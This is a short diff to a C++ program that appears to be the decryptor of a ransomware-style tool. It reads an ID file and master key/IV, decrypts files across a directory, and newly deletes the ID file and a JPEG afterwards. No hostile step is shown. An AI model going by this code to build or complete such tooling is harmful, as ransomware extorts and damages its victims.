@@ -203,7 +203,7 @@ int main()
 	std::string id;
 	Status status;
 	string path = ROOT_DIR;
-	string pathToID = get_home() + R"(\SquanchedID.id)";
+	string pathToID = get_path_to_id();
 	std::ifstream idFile;
 	string sMasterIV, sMasterKey;
 
@@ -232,6 +232,10 @@ int main()
 	
 	iterate(path, &decrypt_wrapper, masterIV, masterKey);
 
+
+	remove(pathToID);
+	string pathToImage = get_path_to_jpeg();
+	remove(pathToImage);
 	//HeapFree(cipher);
 
 	return 0;
